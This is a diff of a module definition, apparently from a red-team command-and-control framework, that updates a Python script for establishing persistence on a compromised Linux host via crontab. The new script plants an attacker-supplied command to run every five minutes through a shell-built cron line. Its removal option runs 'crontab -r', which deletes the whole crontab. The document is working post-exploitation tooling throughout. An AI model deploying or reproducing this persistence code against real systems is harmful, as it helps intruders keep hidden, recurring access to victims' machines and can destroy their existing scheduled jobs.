@@ -1,7 +1,7 @@
 name: Persistence with crontab
 authors:
-  - '@424f424f'
-description: This module establishes persistence via crontab
+  - '@Cx01N'
+description: This module establishes persistence via crontab.
 software: ''
 techniques:
   - T1168
@@ -10,55 +10,46 @@ output_extension: ''
 needs_admin: false
 opsec_safe: false
 language: python
-min_language_version: '2.6'
+min_language_version: '3.8'
 comments:
   - ''
 options:
   - name: Agent
-    description: Agent to grab a screenshot from.
+    description: Agent to run module on.
     required: true
     value: ''
+  - name: Command
+    description: Command to run as a cron job.
+    required: true
+    value: 'python3 /home/kali/test.py'
+  - name: CronSettings
+    description: Command to run as a cron job.
+    required: false
+    value: '*/5 * * * *'
   - name: Remove
-    description: Remove Persistence. True/False
+    description: Remove the cron job.
     required: false
-    value: ''
-  - name: Hourly
-    description: Hourly persistence.
-    required: false
-    value: ''
-  - name: Hour
-    description: Hour to callback. 24hr format.
-    required: false
-    value: ''
-  - name: FileName
-    description: File name for the launcher.
-    required: true
-    value: ''
+    value: 'False'
+    suggested_values:
+      - 'True'
+      - 'False'
+    strict: true
 script: |
   import subprocess
-  import sys
-  Remove = "{{ Remove }}"
-  Hourly = "{{ Hourly }}"
-  Hour = "{{ Hour }}"
-
-
-  if Remove == "True":
-      cmd = 'crontab -l | grep -v "{{ FileName }}"  | crontab -'
-      print(subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read())
-      print(subprocess.Popen('crontab -l', shell=True, stdout=subprocess.PIPE).stdout.read())
-      print("Finished")
-
-  else:
-      if Hourly == "True":
-          cmd = 'crontab -l | { cat; echo "0 * * * * {{ FileName }}"; } | crontab -'
-          print(subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read())
-          print(subprocess.Popen('crontab -l', shell=True, stdout=subprocess.PIPE).stdout.read())
-          print(subprocess.Popen('chmod +x {{ FileName }}', shell=True, stdout=subprocess.PIPE).stdout.read())
-          print("Finished")
-
-      elif Hour:
-              cmd = 'crontab -l | { cat; echo "0 {{ Hour }} * * * {{ FileName }}"; } | crontab -'
-              print(subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read())
-              print(subprocess.Popen('crontab -l', shell=True, stdout=subprocess.PIPE).stdout.read())
-              print(subprocess.Popen('chmod +x {{ FileName }}', shell=True, stdout=subprocess.PIPE).stdout.read())
-              print("Finished")
+  
+  command = "{{Command}}"
+  cron_settings = "{{CronSettings}}"
+  delete = '{{Remove}}'
+  
+  try:
+      if delete.lower() == 'true':
+          subprocess.call(['crontab', '-r'])
+          print("Cronjob removed")
+      else:
+          cmd = '(crontab -l > .tab ; echo "' + cron_settings + ' ' + command + '" >> .tab ; crontab .tab ; rm .tab)'
+          proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+          output = proc.stdout.readline()
+          print(output.rstrip())
+          print("Cronjob created")
+  except Exception as e:
+      print("[!] " + str(e))
